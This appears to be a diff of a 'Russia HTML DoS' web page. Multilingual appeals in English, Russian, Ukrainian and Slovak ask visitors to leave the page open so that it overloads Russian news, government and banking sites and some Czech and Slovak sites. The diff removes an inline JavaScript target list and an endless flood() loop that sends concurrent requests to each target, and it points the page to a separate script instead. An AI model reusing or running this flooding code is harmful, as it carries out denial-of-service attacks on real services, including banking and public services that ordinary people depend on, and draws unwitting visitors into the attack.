@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html">
     <head>
         <meta charset="UTF-8" />
         <link rel="icon" type="image/svg+xml" href="favicon.svg" />
@@ -13,44 +13,59 @@
             rel="stylesheet"
         />
         <!-- Sass -->
-        
+        <link rel="stylesheet" href="/src/scss/style.scss" />
         <!-- Js -->
-        
-      <script type="module" crossorigin src="/assets/index.068f5edf.js"></script>
-    <link rel="stylesheet" href="/assets/index.49514944.css">
-  </head>
+        <script type="module" src="/src/js/script.js"></script>
+    </head>
     <main class="container">
         <h1>Russia <span class="yellow">HTML</span> DoS</h1>
         <article class="subtitle">
-            <section>
+            <section lang="en">
                 <h2>English</h2>
                 <p>
-                    For security concerns, you are able to simply save the
-                    webpage, and run locally - as well as view the source. It is
-                    entirely HTML and browser interpreted. The "official" news
-                    in russian federation are all fake and we believe it is
-                    better to shut them down! Please, just open this page and
-                    let it be open on your devices, it will flood the web-sites
-                    and pose a huge load on their infrastructure
+                    The public news that is presented in the Russian federation
+                    is all fake and we believe that it's better to shut it down!
+                    If you want to help take the fake news down and join the digital
+                    protest, please open this site on your devices in the background
+                    and just let it idle. This site works by making a lot of requests
+                    to the sites specified below in the stats section, thus overloading
+                    them and posing a huge load on their infrastructure. May god help us all.
                 </p>
-            </section>
+            </section lang="ru">
             <section>
                 <h2>Русская версия</h2>
                 <p>
-                    "Официальные" новости в рф - это театр абсурда и мы считаем,
-                    что это нужно остановить! Пожалуйста, просто откройте эту
-                    страницу на своём компьютере и оставтье вкладку открытой,
-                    она будет автоматически нагружать сайты российской
-                    пропаганды.
+                    Общественные новости, представленные в Российской Федерации
+                    все они фальшивые, и мы считаем, что их лучше закрыть!
+                    Если вы хотите помочь уничтожить фальшивые новости и присоединиться к цифровому
+                    протесту, пожалуйста, откройте этот сайт на ваших устройствах в фоновом режиме
+                    и пусть он просто простаивает. Этот сайт работает, делая большое количество запросов
+                    к сайтам, указанным ниже в разделе статистики, перегружая тем самым
+                    их и создавая огромную нагрузку на их инфраструктуру. Да поможет нам всем Бог.
                 </p>
             </section>
-            <section>
+            <section lang="ua">
                 <h2>Українська версія</h2>
                 <p>
-                    Офіційні новини в рф - це театр абсурду і ми вважаємо, що це
-                    треба зупинити! Будь ласка, просто залиште відкритою цю
-                    сторінку на своєму комп'ютері щоб вона автоматично
-                    навантажувала сайти російської пропаганди.
+                    Публічні новини, які представлені в Російській Федерації
+                    все це фейк, і ми вважаємо, що краще його закрити!
+                    Якщо ви хочете допомогти позбутися фейкових новин і приєднатися до цифрових
+                    протестуйте, будь ласка, відкрийте цей сайт на своїх пристроях у фоновому режимі
+                    і просто дайте йому простояти. Цей сайт працює, надаючи багато запитів
+                    на сайти, зазначені нижче в розділі статистики, таким чином перевантажуючи
+                    і створює величезне навантаження на їх інфраструктуру. Хай Бог нам усім допоможе.
+                </p>
+            </section>
+            <section lang="sk">
+                <h2>Slovenská verzia</h2>
+                <p>
+                    Verejné správy, ktoré sú prezentované v Ruskej federácii
+                    sú všetky falošné a veríme, že je lepšie ich eliminovať!
+                    Ak chcete pomôcť odstrániť falošné správy a pripojiť sa k digitálnemu
+                    protestu, prosím otvorte si túto stránku na svojich zariadeniach na pozadí
+                    a nechajte ju na pozadí. Táto stránka funguje tak, že vytvára veľa žiadostí
+                    na stránky uvedené nižšie v časti so štatistikami, čím sa preťažujú
+                    a predstavujú obrovskú záťaž pre ich infraštruktúru. Nech nám boh všetkým pomáha.
                 </p>
             </section>
         </article>
@@ -66,8 +81,9 @@
             any site has that - that means their servers are under load and are
             dropping packets - which is the goal!
         </p>
-         <div id="stats" class="stats">
+        <div id="stats" class="stats">
             <pre>
+            <!-- Make sure to clone stats text below without error_message into src/script.js (targets list) -->
  
         {
             "https://lenta.ru/": {
@@ -254,231 +270,10 @@
         </div>
         <div id="errors"></div>
     </article>
-    <article class="news container">
-        <p>
-            If you missed it, BBC NEWS: Ukraine conflict:
-            <a
-                title="Russian forces attack from three sides"
-                href="https://www.bbc.com/news/world-europe-60503037"
-                >Russian forces attack from three sides</a
-            >
-        </p>
-    </article>
     
     <script async defer src="https://scripts.simpleanalyticscdn.com/latest.js"></script>
     <noscript><img src="https://queue.simpleanalyticscdn.com/noscript.gif" alt="" referrerpolicy="no-referrer-when-downgrade" /></noscript>
-    
-    <script>
-        var targets = {
-            "https://lenta.ru": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://ria.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://ria.ru/lenta/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://www.rbc.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://www.rt.com/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "http://kremlin.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "http://en.kremlin.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://smotrim.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://tass.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://tvzvezda.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://vsoloviev.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://www.1tv.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://www.vesti.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://online.sberbank.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://sberbank.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://gosuslugi.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://mil.ru": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://iz.ru": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://yandex.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://sputniknews.com/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://inosmi.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://gazeta.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://kommersant.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://rubaltic.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://ura.news/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://radiokp.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://echo.msk.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://life.ru/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-            },
-            "https://cz.sputniknews.com/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "https://sputniknews.com/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "https://www.parlamentnilisty.cz/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "https://zemavek.sk/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "https://hlavnespravy.sk/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "https://www.rudyprapor.cz/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "https://aliancenarodnichsil.cz/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-            "http://otevrisvoumysl.cz/": {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                "error_message": "Failed to fetch"
-            },
-        };
 
-        var statsEl = document.getElementById("stats");
-        function printStats() {
-            statsEl.innerHTML =
-                "<pre>" + JSON.stringify(targets, null, 2) + "</pre>";
-        }
-        setInterval(printStats, 100);
-
-        var CONCURRENCY_LIMIT = 200;
-        var queue = [];
-
-        async function fetchWithTimeout(resource, options) {
-            const controller = new AbortController();
-            const id = setTimeout(() => controller.abort(), options.timeout);
-            return fetch(resource, {
-                signal: controller.signal,
-            })
-                .then((response) => {
-                    clearTimeout(id);
-                    return response;
-                })
-                .catch((error) => {
-                    clearTimeout(id);
-                    throw error;
-                });
-        }
-
-        async function flood(target) {
-            for (var i = 0; ; ++i) {
-                if (queue.length > CONCURRENCY_LIMIT) {
-                    await queue.shift();
-                }
-                queue.push(
-                    fetchWithTimeout(target, { timeout: 1000 })
-                        .catch((error) => {
-                            if (error.code === 20 /* ABORT */) {
-                                return;
-                            }
-                            targets[target].number_of_errored_responses++;
-                            targets[target].error_message = error.message;
-                        })
-                        .then((response) => {
-                            if (response && !response.ok) {
-                                targets[target].number_of_errored_responses++;
-                                targets[target].error_message =
-                                    response.statusText;
-                            }
-                            targets[target].number_of_requests++;
-                        })
-                );
-            }
-        }
-
-        //Start
-        Object.keys(targets).map(flood);
-    </script>
     <script>
         type =
             "text/javascript" >
